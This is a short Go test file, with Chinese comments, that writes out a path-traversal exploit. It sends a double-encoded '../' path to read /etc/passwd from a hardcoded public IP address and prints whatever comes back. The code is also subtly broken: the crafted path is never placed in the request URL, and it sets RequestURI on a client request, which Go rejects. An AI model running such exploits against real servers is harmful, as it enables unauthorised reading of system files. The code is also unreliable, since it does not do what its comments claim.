package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"testing"
)

func TestMain(m *testing.M) {
	// 构造包含非法转义字符的路径
	rawPath := "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
	baseURL := "http://47.103.86.115:8085"

	// 手动解析 URL，避免 Go 自动编码
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		fmt.Println("解析URL失败:", err)
		return
	}

	// 手动设置 requestURI，不进行 URL 编码
	req, err := http.NewRequest("GET", baseURL, nil)
	if err != nil {
		fmt.Println("创建请求失败:", err)
		return
	}

	// 手动设置请求的 URL 和 RequestURI，避免自动校验
	req.URL = parsedURL
	req.RequestURI = rawPath

	// 创建客户端并发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("请求失败:", err)
		return
	}
	defer resp.Body.Close()

	// 读取并打印响应
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return
	}

	fmt.Println("状态码:", resp.StatusCode)
	fmt.Println("响应体:")
	fmt.Println(string(body))
}
